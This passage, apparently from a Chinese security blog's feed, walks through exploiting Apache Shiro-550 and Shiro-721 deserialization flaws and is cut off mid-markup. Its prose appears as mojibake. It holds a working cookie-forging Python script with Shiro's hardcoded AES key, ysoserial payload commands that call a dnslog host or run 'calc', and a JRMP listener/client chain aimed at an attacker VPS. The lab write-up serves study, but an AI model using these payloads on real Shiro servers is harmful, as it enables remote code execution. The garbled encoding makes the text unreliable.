å†™çš„æ¯”è¾ƒä¹±ï¼Œç‰¹åˆ«æ˜¯Filterå†…å­˜é©¬ã€‚<br>è¿™ä¹Ÿæ˜¯æˆ‘æ‹–äº†3ä¸ªæœˆæ‰æ¥æçš„ä¸œè¥¿ï¼Œè¿™å­¦æœŸäº‹æœ‰ç‚¹å¤šï¼Œå¾ˆå¤šä¹‹å‰æƒ³æçš„ä¸œè¥¿éƒ½æ²¡è…¾å‡ºæ—¶é—´å¼„ã€‚<br>è¿™ç¯‡æ–‡ç« è®²åˆ°çš„å†…å­˜é©¬å®é™…ä¸Šå¹¶æ²¡æœ‰å®ç°å®Œå…¨çš„æ— æ–‡ä»¶è½åœ°ï¼Œä¸­é—´ä¼šæœ‰æ¶æ„JSPæ–‡ä»¶è½åœ°ã€‚æ›´é«˜çº§çš„æ”»å‡»å½¢å¼åé¢å†æå§ã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/">http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext">https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext</a></p><p><a href="https://blog.csdn.net/angry_program/article/details/116661899">https://blog.csdn.net/angry_program/article/details/116661899</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tomcatå†…å­˜é©¬&quot;&gt;&lt;a href=&quot;#tomcatå†…å­˜é©¬&quot; class=&quot;headerlink&quot; title=&quot;tomcatå†…å­˜é©¬&quot;&gt;&lt;/a&gt;tomcatå†…å­˜é©¬&lt;/h1&gt;&lt;h2 id=&quot;tomcat-å®¹å™¨&quot;&gt;&lt;a href=&quot;#tomcat-å®¹å™¨&quot; class</summary>
      
    
    
    
    
    <category term="javaå¼€å‘ä¸å®‰å…¨" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>shiroååºåˆ—åŒ–(shiro-550ä¸shiro-721)</title>
    <link href="http://const27.com/2021/06/28/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro-550%E4%B8%8Eshiro-721)/"/>
    <id>http://const27.com/2021/06/28/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro-550%E4%B8%8Eshiro-721)/</id>
    <published>2021-06-28T13:51:11.047Z</published>
    <updated>2021-03-13T07:19:29.768Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h1><p>Apache shiro æ˜¯javaçš„ä¸€ä¸ªå®‰å…¨æ¡†æ¶ï¼Œå¯ä»¥å¸®åŠ©å®Œæˆè®¤è¯ï¼Œæˆæƒï¼ŒåŠ å¯†ï¼Œä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ã€‚å®ƒä¸è·Ÿä»»ä½•æ¡†æ¶æˆ–å®¹å™¨ç»‘å®šï¼Œå¯ä»¥ç‹¬ç«‹è¿è¡Œã€‚</p><h2 id="æ€ä¹ˆåˆ¤æ–­æ˜¯å¦æ˜¯shiroç½‘ç«™"><a href="#æ€ä¹ˆåˆ¤æ–­æ˜¯å¦æ˜¯shiroç½‘ç«™" class="headerlink" title="æ€ä¹ˆåˆ¤æ–­æ˜¯å¦æ˜¯shiroç½‘ç«™"></a>æ€ä¹ˆåˆ¤æ–­æ˜¯å¦æ˜¯shiroç½‘ç«™</h2><p>å‘é€cookieå¸¦æœ‰rememberMe=0çš„åŒ…ï¼Œè‹¥è¿”å›åŒ…çš„å¤´éƒ¨æœ‰rememberMeï¼Œåˆ™ä¸ºshiroç«™ç‚¹</p><h1 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>å½“shiroç‰ˆæœ¬å°äº1.2.5æ—¶ï¼Œä¸»è¦æ˜¯ç”±shiroçš„rememberMeå†…å®¹ååºåˆ—åŒ–å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œé€ æˆçš„åŸå› æ˜¯AESå¯†é’¥è¢«ç¡¬ç¼–ç åœ¨shiroæºç ä¸­ï¼Œè¿™å°±å¯¼è‡´äº†å¯ä»¥é€šè¿‡åœ¨cookieçš„rememberMeå­—æ®µæ’å…¥payloadå®ç°ä»»æ„ä»£ç æ‰§è¡Œ</p><h2 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h2><p>git clone <a href="https://github.com/apache/shiro.git">https://github.com/apache/shiro.git</a> ä¸‹è½½shiro</p><p>ç„¶å git checkout shiro-root-1.2.4,åˆ‡æ¢åˆ°1.2.4ç‰ˆæœ¬è¿›è¡Œå¯¹åº”ç‰ˆæœ¬çš„æ¼æ´è°ƒè¯•</p><p>ç¼–è¾‘shiro/samples/web/pom.xmlæ–‡ä»¶ï¼Œåœ¨æ­¤å¤„åŠ å…¥ <version>1.2</version> </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309141612431.png" alt="image-20210309141612431"></p><p>ç„¶åideaæ‰“å¼€shiro/samples/web ä¸‹çš„pom.xml,ç„¶åRun -&gt; Edit Configurations æ·»åŠ TomcatServer</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309142858354.png" alt="image-20210309142858354"></p><p>å¾…ideaåŠ è½½å®Œmavenåï¼Œå‘tomcatéƒ¨ç½²å·¥ä»¶</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309143500761.png" alt="image-20210309143500761"></p><p>å‡ºç°ä»¥ä¸‹é¡µé¢åˆ™è¯´æ˜ç¯å¢ƒæ­å»ºæˆåŠŸ</p><p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20210309143605131.png" alt="image-20210309143605131"></p><h2 id="å¼€å§‹åŠ¨è°ƒ"><a href="#å¼€å§‹åŠ¨è°ƒ" class="headerlink" title="å¼€å§‹åŠ¨è°ƒ"></a>å¼€å§‹åŠ¨è°ƒ</h2><h3 id="åºåˆ—åŒ–ï¼ŒåŠ å¯†"><a href="#åºåˆ—åŒ–ï¼ŒåŠ å¯†" class="headerlink" title="åºåˆ—åŒ–ï¼ŒåŠ å¯†"></a>åºåˆ—åŒ–ï¼ŒåŠ å¯†</h3><p>åœ¨org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin å¤„ä¸‹æ–­ç‚¹<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144449196.png" alt="image-20210309144449196"></p><p>ç„¶åè¿›å…¥shiroç™»é™†é¡µé¢ï¼Œå‹¾é€‰<em>rememberme</em>ï¼Œè¿›è¡Œç™»å½•ï¼Œæ–­ç‚¹å‘½ä¸­</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309144539506.png" alt="image-20210309144539506"></p><p>ç„¶åä¼šæ ¡éªŒtokené‡Œé¢çš„remembermeæ˜¯å¦ä¸ºtrueï¼Œè‹¥ä¸ºtrueåˆ™æ‰§è¡ŒrememberIdentityå‡½æ•°</p><p>æˆ‘ä»¬è·Ÿè¿›rememberIdentityå‡½æ•°</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145259149.png" alt="image-20210309145259149"></p><p>å‘ç°principalså˜é‡è·å–äº†éœ€è¦rememberçš„ç”¨æˆ·åï¼ˆæ­¤å¤„ä¸ºrootï¼‰ï¼Œç„¶åå†è°ƒç”¨é‡è½½å‡½æ•°rememberIdentityã€‚<br>è¿™ä¸ªå‡½æ•°è°ƒç”¨äº†convertPrincipalsToBytes,æˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹è¿™ä¸ªå‡½æ•°</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309145901675.png" alt="image-20210309145901675"></p><p>å¯ä»¥å‘ç°å¯¹ä¼ å…¥çš„principalsè°ƒç”¨äº†serializeæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›serializeæ–¹æ³•</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150019544.png" alt="image-20210309150019544"></p><p>ç»§ç»­è·Ÿè¿›serializeä¼šæ¥åˆ°è¿™ä¸ªåœ°æ–¹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309150133277.png" alt="image-20210309150133277"></p><p>å‘ç°å°±æ˜¯å¯¹å…¶è°ƒç”¨äº†writeObject()è¿™ä¸ªåŸç”Ÿååºåˆ—æ–¹æ³•è€Œå·²ï¼Œæ²¡ä»€ä¹ˆå¥½åº·çš„ï¼Œè½¬å›å¤´å»çœ‹çœ‹convertPrincipalsToBytesé‚£ä¸ªåŠ å¯†å‡½æ•°encrypt</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309152804516.png" alt="image-20210309152804516"></p><p>å‘ç°é€šè¿‡getCipherServiceæ–¹æ³•è¿”å›äº†ä¸€ä¸ªä¸œè¥¿ï¼Œå‘ç°æ˜¯åŠ å¯†æ–¹å¼ç­‰ä¸œè¥¿</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309153312468.png" alt="image-20210309153312468"></p><p>åœ¨æ­¤å¤„156è¡Œä¼šè°ƒç”¨å¦ä¸€ä¸ªencryptæ–¹æ³•ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åºåˆ—åŒ–åçš„ç”¨æˆ·åï¼Œç¬¬äºŒä¸ªå‚æ•°åˆ™æ˜¯å¯†é’¥ï¼ˆè¿™ä¸ªå¯†é’¥æ˜¯ç¡¬ç¼–ç å†™å…¥æ–‡ä»¶çš„ï¼Œæ‰€ä»¥é€ æˆäº†å®‰å…¨é—®é¢˜ï¼‰æˆ‘ä»¬è·Ÿè¿›</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309154512813.png" alt="image-20210309154512813"></p><p>è¿™é‡Œçš„ivBytesæ˜¯ä¸€ä¸ªéšæœºç”Ÿæˆçš„ivï¼ˆæˆ‘æ²¡è·Ÿè¿›ç»†çœ‹),ç„¶ååœ¨è¿™ä¸ªæ–¹æ³•æœ€åå®ƒè°ƒç”¨äº†encryptçš„é‡è½½å‡½æ•°ï¼Œå¹¶ä¼ å…¥äº†åºåˆ—åŒ–åçš„ç”¨æˆ·åï¼Œkeyï¼Œivï¼Œä»¥åŠä¸€ä¸ªtrueã€‚æˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155203309.png" alt="image-20210309155203309"></p><p>å¯ä»¥å‘ç°é€šè¿‡arraycopyï¼ŒæŠŠivå’ŒåŠ å¯†åçš„å¯†æ–‡æ•°æ®ï¼ˆaesï¼‰æ”¾å…¥äº†output,æœ€åè¿”å›äº†output. ç„¶åè¿™ä¸ªreturnä¼šä¸€ç›´è¿”å›åˆ°æ­¤å¤„</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155606194.png" alt="image-20210309155606194"></p><p>outputçš„å†…å®¹ä½œä¸ºå‚æ•°ä¼ å…¥äº†rememberSerializedIdentityï¼Œè·Ÿè¿›è¯¥å‡½æ•°</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309155736406.png" alt="image-20210309155736406"></p><p>56è¡Œï¼ŒæŠŠbase64åŠ å¯†åçš„outputä½œä¸ºå€¼å†™å…¥åˆ°cookieä¸­çš„remembernameé”®</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162524164.png" alt="image-20210309162524164"></p><p>57è¡Œå°†å…¶è¿”å›ç»™å®¢æˆ·ç«¯</p><p>burpæŠ“åŒ…å‘ç°äº‹å®ç¡®å®å¦‚æ­¤</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309162406182.png" alt="image-20210309162406182"></p><p>å¦å¤–è¯´ä¸€ä¸‹é‚£ä¸ªç¡¬ç¼–ç keyï¼Œé‚£ä¸ªç¡¬ç¼–ç çš„keyåœ¨AbstractRememberMeManager.class DEFAULT_CIPHER_KEY_BYTESé‡Œ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309163021784.png" alt="image-20210309163021784"></p><p>å¯ä»¥å‘ç°é€šè¿‡getEncryptionCipherKeyè·å¾—çš„keyç¡®å®æ˜¯DEFAULT_CIPHER_KEY_BYTES</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309164110278.png" alt="image-20210309164110278"></p><p>æˆ‘ä»¬ç®€è¦çš„æ¢³ç†ä¸€ä¸‹è¿™ä¸ªæµç¨‹ï¼Œ å½“æˆ‘ä»¬å‹¾é€‰remembermeåï¼Œç”¨æˆ·åä¼šè¢«åºåˆ—åŒ–å¤„ç†ï¼Œç„¶åä¸ç¡¬ç¼–ç çš„keyï¼Œéšæœºç”Ÿæˆçš„ivä¸€èµ·è¿›è¡ŒåŠ å¯†ï¼Œç„¶åä»¥ iv+å¯†æ–‡ çš„base64ç¼–ç è¿”å›ç»™ç”¨æˆ·çš„é”®ä¸ºremembermeçš„cookieé‡Œã€‚</p><h3 id="ååºåˆ—åŒ–ï¼Œè§£å¯†"><a href="#ååºåˆ—åŒ–ï¼Œè§£å¯†" class="headerlink" title="ååºåˆ—åŒ–ï¼Œè§£å¯†"></a>ååºåˆ—åŒ–ï¼Œè§£å¯†</h3><p>åœ¨æˆ‘ä»¬å‹¾é€‰remembermeç™»é™†åï¼Œåˆ·æ–°ï¼ŒæŠ“åŒ…ï¼Œå°†å…¶JSESSIONIDåˆ é™¤ï¼Œä½¿shiroéªŒè¯cookieä¸­remembermeçš„å€¼æ˜¯å¦æ­£ç¡®ï¼ˆå¦‚æœä¸åˆ é™¤JSESSIONIDï¼Œshiroåˆ™ç›´æ¥ä»¥JSESSIONIDä¸ºç™»é™†å‡­è¯äº†ï¼Œå°±ä¸ä¼šéªŒè¯remembermeä¸­çš„å€¼äº†ï¼‰</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213036364.png" alt="image-20210309213036364"></p><p>åœ¨org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity æ‰“ä¸‹æ–­ç‚¹ï¼Œæ”¾åŒ…ï¼Œæ–­ç‚¹å‘½ä¸­ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213222271.png" alt="image-20210309213222271"></p><p>è·Ÿè¿›getRememberedPrincipalsæ–¹æ³•</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213255317.png" alt="image-20210309213255317"></p><p>éšåå†è·Ÿè¿›getRememberedSerializedIdentity</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309213345511.png" alt="image-20210309213345511"></p><p>å…³æ³¨è¿™é‡Œçš„86è¡Œï¼Œæ­¤å¤„çš„æ„æ€æ˜¯ä»cookieä¸­è·å¾—base64ç¼–ç åçš„cookieå€¼ï¼Œéšååœ¨90è¡Œå¯¹å…¶è¿›è¡Œå¡«å……ï¼ˆCBCåŠ å¯†ä¸­çš„ä¸€ä¸ªæµç¨‹ï¼‰ï¼Œ95è¡Œè¿›è¡Œbase64è§£ç ï¼Œå¹¶å°†å…¶è¿”å›</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214329614.png" alt="image-20210309214329614"></p><p>éšåæˆ‘ä»¬å›åˆ°getRememberedPrincipalsæ–¹æ³•ï¼Œè·Ÿè¿›å…¶convertBytesToPrincipalsæ–¹æ³•</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214559031.png" alt="image-20210309214559031"></p><p>å‘ç°å…¶ä¸­æœ‰ä¸ªdecryptæ–¹æ³•ï¼Œè¿™é‡Œçš„decryptæ–¹æ³•å°±æ˜¯å¯¹å…¶è¡Œaesè§£å¯†ï¼Œå–å‰åå…­ä½ä¸ºIVã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214846036.png" alt="image-20210309214846036"></p><p>ä¸‹é¢140è¡Œåˆ™æ˜¯å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–å¤„ç†äº†ã€‚æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214941029.png" alt="image-20210309214941029"></p><p>å†æ¬¡è·Ÿè¿›deserializeæ–¹æ³•</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309215227753.png" alt="image-20210309215227753"></p><p>çœ‹åˆ°readObject,å°±æ„å‘³ç€ååºåˆ—åŒ–æµç¨‹ç»“æŸäº†ã€‚</p><p>æ¢³ç†ä¸€ä¸‹ï¼Œcookieä¸­remenberå€¼ä¼ å…¥åå…ˆbase64è§£ç ï¼Œç„¶åaesè§£å¯†ï¼Œç„¶åååºåˆ—åŒ–ã€‚</p><h3 id="è§£å¯†ï¼Œé‡å†™cookieï¼Œä»¥å†™å…¥payload"><a href="#è§£å¯†ï¼Œé‡å†™cookieï¼Œä»¥å†™å…¥payload" class="headerlink" title="è§£å¯†ï¼Œé‡å†™cookieï¼Œä»¥å†™å…¥payload"></a>è§£å¯†ï¼Œé‡å†™cookieï¼Œä»¥å†™å…¥payload</h3><p>æ—¢ç„¶keyæ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬çŸ¥é“äº†keyæ˜¯ä»€ä¹ˆï¼ŒåŒæ—¶åœ¨CBCè§£å¯†çš„æ—¶å€™ï¼ŒIVçš„ä½œç”¨åªæ˜¯ä½œä¸ºç¬¬ä¸€ä¸ªåŒºå—å»è§£å¯†ç¬¬äºŒä¸ªåŒºå—ï¼ˆç”Ÿæˆçš„ç»“æœå»è§£å¯†ç¬¬ä¸‰ä¸ªåŒºå—ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ï¼Œæ‰€ä»¥IVå¯ä»¥ä¸ºéšæœºå€¼æ²¡ä»€ä¹ˆç‰¹åˆ«è¦æ±‚ï¼ˆåªè¦èƒ½è§£å¯†å°±è¡Œäº†ï¼‰é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±ä¼ªé€ ä¸€ä¸ªcookieã€‚</p><p>pythonè„šæœ¬å¦‚ä¸‹(å«–çš„ç¬‘å¸ˆå‚…çš„)ï¼Œåºåˆ—åŒ–payloadç”¨base64æ ¼å¼ä¼ å…¥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pip install pycrypto</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">mode &#x3D;  AES.MODE_CBC</span><br><span class="line">IV   &#x3D; uuid.uuid4().bytes</span><br><span class="line">encryptor &#x3D; AES.new(base64.b64decode(key), mode, IV)</span><br><span class="line"></span><br><span class="line">payload&#x3D;base64.b64decode(sys.argv[1])</span><br><span class="line">BS   &#x3D; AES.block_size</span><br><span class="line">pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">payload&#x3D;pad(payload)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åªéœ€è¦ä¼ å…¥base64ç¼–ç çš„ï¼Œå»é™¤æ¢è¡Œç¬¦çš„payloadå³å¯ã€‚</p><p>åƒè¿™æ ·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><h4 id="å¯†é’¥è·å–"><a href="#å¯†é’¥è·å–" class="headerlink" title="å¯†é’¥è·å–"></a>å¯†é’¥è·å–</h4><p>æœ‰äº›æ—¶å€™keyå¹¶ä¸æ˜¯ä¸€æˆä¸å˜çš„kPH+bIxk5D2deZiIxcaaaA==ï¼Œè€Œæœ‰å¯èƒ½æ˜¯å…¶ä»–å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å·¥å…·<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a> æ¥çˆ†ç ´å‡ºå¯†é’¥</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 </span><br></pre></td></tr></table></figure><p>å³å¯å¼€å§‹çˆ†ç ´ï¼Œå½“ç„¶è¿™ä¸ªå·¥å…·çš„ä½œç”¨ä¸ä»…ä»…å¦‚æ­¤</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310132845771.png" alt="image-20210310132845771"></p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>è¿™ä¸ªé“¾å…¶å®æ ¹æœ¬æ²¡å•¥å±å®³..åªæ˜¯æ‹¿æ¥æµ‹è¯•ä¸€ä¸‹æœ‰æ²¡æœ‰æ´</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆpayloadï¼Œåƒcookieä¼ªé€ è„šæœ¬ä¼ å…¥ï¼Œè·å¾—ä¼ªé€ çš„cookie</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115008147.png" alt="image-20210310115008147"></p><p>remembermeç™»é™†åï¼Œåˆ·æ–°æŠ“åŒ…ï¼Œåˆ é™¤cookieä¸­çš„sessionï¼Œæ›¿æ¢cookieä¸­çš„remembermeä¸ºä¼ªé€ åçš„cookieã€‚æ”¾åŒ…,DNSLOGæœ‰ååº”</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310115425170.png" alt="image-20210310115425170"></p><h3 id="ccé“¾"><a href="#ccé“¾" class="headerlink" title="ccé“¾"></a>ccé“¾</h3><h5 id="ccé“¾2"><a href="#ccé“¾2" class="headerlink" title="ccé“¾2"></a>ccé“¾2</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ¶ä½œcookieï¼Œå‘è¿‡å»ï¼ŒæˆåŠŸå¼¹è®¡ç®—å™¨</p><h5 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h5><p>é€šè¿‡è¿è¡Œmvn dependency:list å‘½ä»¤å¯ä»¥å‘ç°å½“å‰Commons Collections çš„ç‰ˆæœ¬æ˜¯3.2.1</p><p>æŒ‰ç†è¯´ä¼šæœ‰ccé“¾5ï¼Œä½†æ˜¯å®é™…ä¸Šç”¨ysoserial ç”Ÿæˆpayloadç”¨ä¸Šé¢çš„æ–¹æ³•æ‰“è¿‡å»åæ²¡æœ‰ååº”ã€‚çœ‹åˆ«äººåšå®¢å‘ç°æ˜¯è¿™ä¸ªåŸå›  â€œShiro resovleClassä½¿ç”¨çš„æ˜¯ClassLoader.loadClass()è€ŒéClass.forName()ï¼Œè€ŒClassLoader.loadClassä¸æ”¯æŒè£…è½½æ•°ç»„ç±»å‹çš„classã€‚â€ è§£å†³è¿™ç§é—®é¢˜çš„åŠæ³•æ˜¯ç”¨JRMP</p><p>vpsä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œç›‘å¬ç«¯å£</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 &#39;calc&#39;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å†é€šè¿‡ysoserialç”Ÿæˆpayload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#39;vps_ip:12006&#39;|base64|sed &#39;:label;N;s&#x2F;\n&#x2F;&#x2F;;b label&#39;</span><br></pre></td></tr></table></figure><p>ç„¶åä¼ªé€ cookieï¼Œå‘è¿‡å»ï¼ŒæˆåŠŸå¼¹è®¡ç®—å™¨</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310194746492.png" alt="image-20210310194746492"></p><h2 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h2><p>è¿™ä¸ªæ´å› ä¸ºcookieä¸­çš„å€¼ä½¿ç”¨ç¡¬ç¼–ç çš„keyåŠ å¯†è€Œæˆï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤æ¥ä¼ªé€ cookieï¼Œé¡ºä¾¿åœ¨cookieé‡Œå†™å…¥å±é™©çš„paylaodå¦‚ccé“¾payloadï¼Œä½¿cookieä¸­çš„å€¼è¢«è§£å¯†ï¼Œéšåç»å†ååºåˆ—åŒ–ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œ</p><p>å‚è€ƒï¼š<a href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a> ç¬‘å¸ˆå‚…å¤§å¤§</p><h1 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h1><p>å»å¹´å­¦çš„Padding Oracle åœ¨æ­¤å¤„è¢«åˆ©ç”¨äº†èµ·æ¥ã€‚å¯ä»¥å…ˆçœ‹çœ‹Padding Oracle Attack å¤§æ¦‚æ˜¯ä¸ªå•¥<a href="https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/">https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/</a></p><p>å½±å“ç‰ˆæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.2.5, </span><br><span class="line">1.2.6, </span><br><span class="line">1.3.0, </span><br><span class="line">1.3.1, </span><br><span class="line">1.3.2, </span><br><span class="line">1.4.0-RC2, </span><br><span class="line">1.4.0, </span><br><span class="line">1.4.1</span><br></pre></td></tr></table></figure><h2 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>å…¶å®æ¼æ´ä»£ç å±‚é¢é€»è¾‘ä¸Šå’Œshiro-550å¤§è‡´ç›¸ä¼¼ï¼Œåªä¸è¿‡keyæ²¡æœ‰ç¡¬ç¼–ç è¿›ä»£ç ä¸­äº†ã€‚<br>ä½†æ˜¯åªè¦æˆ‘ä»¬è·å¾—ä¸€ä¸ªremembermeç”¨æˆ·çš„cookieåå°±å¯ä»¥é€šè¿‡padding oracle attack ä¼ªé€ ä»»æ„cookieå‘è¿‡å»äº†ï¼Œä»è€Œé€ æˆååºåˆ—åŒ–æ¼æ´äº†</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>åœ¨è¿™é‡Œä¸‹è½½1.4.1çš„waråŒ…<a href="https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war%EF%BC%8C%E5%B9%B6%E6%94%BE%E5%85%A5tomcat">https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.warï¼Œå¹¶æ”¾å…¥tomcat</a> webappsæ–‡ä»¶å¤¹ï¼Œéšåå¯åŠ¨tomcatï¼Œè®¿é—®<a href="http://127.0.0.1:8080/samples-web-1.4.1/">http://127.0.0.1:8080/samples-web-1.4.1/</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310220716846.png" alt="image-20210310220716846"></p><h2 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" 